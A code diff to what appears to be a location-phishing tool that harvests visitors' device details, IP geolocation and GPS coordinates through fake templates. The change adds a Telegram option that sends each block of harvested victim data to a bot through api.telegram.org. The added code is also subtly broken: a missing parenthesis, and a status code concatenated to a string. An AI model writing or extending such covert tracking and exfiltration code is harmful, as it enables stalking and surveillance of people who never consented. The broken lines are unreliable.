@@ -17,6 +17,7 @@ from os import path, kill, mkdir, getenv, environ
 from json import loads, decoder
 from packaging import version
 import utils
+import urllib.parse
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-k', '--kml', help='KML filename')
@@ -25,20 +26,21 @@ parser.add_argument('-u', '--update', action='store_true', help='Check for updat
 parser.add_argument('-v', '--version', action='store_true', help='Prints version')
 parser.add_argument('-t', '--template', type=int, help='Load template and loads parameters from env variables')
 parser.add_argument('-d', '--debugHTTP', type=bool, default = False, help='Disable HTTPS redirection for testing only')
-
+parser.add_argument('--telegram', help='Telegram token and chat to use to send results to a telegram bot (format = token:chatId)')
 
 args = parser.parse_args()
 kml_fname = args.kml
 port = getenv("PORT") or args.port
 chk_upd = args.update
 print_v = args.version
+telegram = getenv("TELEGRAM") or args.telegram
+
 if (getenv("DEBUG_HTTP") and (getenv("DEBUG_HTTP") == "1" or getenv("DEBUG_HTTP").lower() == "true")) or args.debugHTTP == True:
 	environ["DEBUG_HTTP"] = "1"
 else:
 	environ["DEBUG_HTTP"] = "0"
 
 templateNum = int(getenv("TEMPLATE")) if getenv("TEMPLATE") and getenv("TEMPLATE").isnumeric() else args.template
-
 
 path_to_script = path.dirname(path.realpath(__file__))
 
@@ -114,6 +116,17 @@ def banner():
 	utils.print(f'{G} |---> {C}Community : {W}{comms_url}')
 	utils.print(f'{G}[>] {C}Version      : {W}{VERSION}\n')
 
+def sendTelegram(content):
+	if telegram is not None:
+		tmpsplit = telegram.split(':')
+		if len(tmpsplit) <2:
+			utils.print(f'{R}[-] {C}Provided Telegram bot information invalid : expected format is Token:chatId (with colon){W}')
+			return
+		r = requests.get('https://api.telegram.org/bot'+tmpsplit[0]+'/sendMessage?chat_id='+tmpsplit[1]+'&text='+urllib.parse.quote_plus(content)
+		if r:
+			utils.print(f'{G}[+] {C}Successfully sent to Telegram bot {W}')
+		else:
+			utils.print(f'{R}[-] {C}Unable to send to Telegram bot {W}'+r.status_code+" => "+r.text)
 
 def template_select(site):
 	utils.print(f'{Y}[!] Select a Template :{W}\n')
@@ -234,8 +247,7 @@ def data_parser():
 		var_ip = info_json['ip']
 
 		data_row.extend([var_os, var_platform, var_cores, var_ram, var_vendor, var_render, var_res, var_browser, var_ip])
-
-		utils.print(f'''{Y}[!] Device Information :{W}
+		deviceInfo = f'''{Y}[!] Device Information :{W}
 
 {G}[+] {C}OS         : {W}{var_os}
 {G}[+] {C}Platform   : {W}{var_platform}
@@ -246,7 +258,9 @@ def data_parser():
 {G}[+] {C}Resolution : {W}{var_res}
 {G}[+] {C}Browser    : {W}{var_browser}
 {G}[+] {C}Public IP  : {W}{var_ip}
-''')
+'''
+		sendTelegram(deviceInfo)
+		utils.print(deviceInfo)
 
 		if ip_address(var_ip).is_private:
 			utils.print(f'{Y}[!] Skipping IP recon because IP address is private{W}')
@@ -265,8 +279,7 @@ def data_parser():
 				var_isp = str(data['isp'])
 
 				data_row.extend([var_continent, var_country, var_region, var_city, var_org, var_isp])
-
-				utils.print(f'''{Y}[!] IP Information :{W}
+				ipInfo = f'''{Y}[!] IP Information :{W}
 
 {G}[+] {C}Continent : {W}{var_continent}
 {G}[+] {C}Country   : {W}{var_country}
@@ -274,7 +287,9 @@ def data_parser():
 {G}[+] {C}City      : {W}{var_city}
 {G}[+] {C}Org       : {W}{var_org}
 {G}[+] {C}ISP       : {W}{var_isp}
-''')
+'''
+				sendTelegram(ipInfo)
+				utils.print(ipInfo)
 
 	with open(RESULT, 'r') as result_file:
 		results = result_file.read()
@@ -293,8 +308,7 @@ def data_parser():
 				var_spd = result_json['spd']
 
 				data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])
-
-				utils.print(f'''{Y}[!] Location Information :{W}
+				locInfo = f'''{Y}[!] Location Information :{W}
 
 {G}[+] {C}Latitude  : {W}{var_lat}
 {G}[+] {C}Longitude : {W}{var_lon}
@@ -302,7 +316,10 @@ def data_parser():
 {G}[+] {C}Altitude  : {W}{var_alt}
 {G}[+] {C}Direction : {W}{var_dir}
 {G}[+] {C}Speed     : {W}{var_spd}
-''')
+'''
+				sendTelegram(locInfo)
+				utils.print(locInfo)
+				
 
 				utils.print(f'{G}[+] {C}Google Maps : {W}https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}')
 
